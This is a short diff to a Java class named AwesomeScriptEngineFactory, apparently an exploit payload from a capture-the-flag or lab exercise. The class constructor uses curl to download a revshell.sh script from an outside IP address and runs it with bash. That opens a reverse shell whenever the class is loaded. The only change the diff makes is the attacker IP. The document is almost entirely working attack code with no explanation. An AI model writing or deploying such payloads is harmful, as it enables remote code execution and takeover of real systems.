@@ -7,7 +7,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-            Runtime.getRuntime().exec("curl http://10.10.14.40:8009/revshell.sh -o /tmp/revshell.sh");
+            Runtime.getRuntime().exec("curl http://10.10.14.82:8009/revshell.sh -o /tmp/revshell.sh");
             Runtime.getRuntime().exec("bash /tmp/revshell.sh");
         } catch (IOException e) {
             e.printStackTrace();
